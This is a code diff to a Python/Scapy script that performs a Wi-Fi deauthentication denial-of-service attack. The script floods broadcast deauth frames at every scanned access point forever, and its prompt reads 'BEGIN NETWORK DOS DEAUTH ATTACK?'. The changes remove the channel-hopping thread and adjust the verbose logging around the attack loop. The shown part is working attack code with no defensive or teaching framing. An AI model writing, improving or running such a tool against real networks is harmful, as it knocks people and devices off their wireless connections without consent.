@@ -24,6 +24,7 @@ channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
 from scapy.all import *
 import subprocess
 
+import random
 import time
 
 from threading import Thread
@@ -156,13 +157,6 @@ FUNCTIONS.
 ATTACKS
 '''
 
-#channel hopping func
-def channelhopper():
-    
-    for channel in channels:
-        subprocess.check_output("iwconfig mon0 channel " + str(channel), shell=True)
-        time.sleep(0.2)
-
 #finally done, broadcasts deauth packets to all scanned aps forever whilst also channel hopping
 def deauth_attack():
     BROADCAST = "FF:FF:FF:FF:FF:FF"
@@ -172,14 +166,14 @@ def deauth_attack():
     
     if is_verbose == "y":
         verboselog=True
-
+    else:
+        verboselog=False
+    
     input("BEGIN NETWORK DOS DEAUTH ATTACK?\nPRESS [ENTER]...")
-
-    #starts channelhopper func as daemon to have packets consistently sent out across all channels   
-    chop = Thread(target=channelhopper(), args=[])
-    chop.daemon = True
-    chop.start()
-
+    
+    if verboselog==False:
+        print("SENDING DEAUTH PACKETS...")
+    
     while True:    
         for bssid in AP_BSSID:
             pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
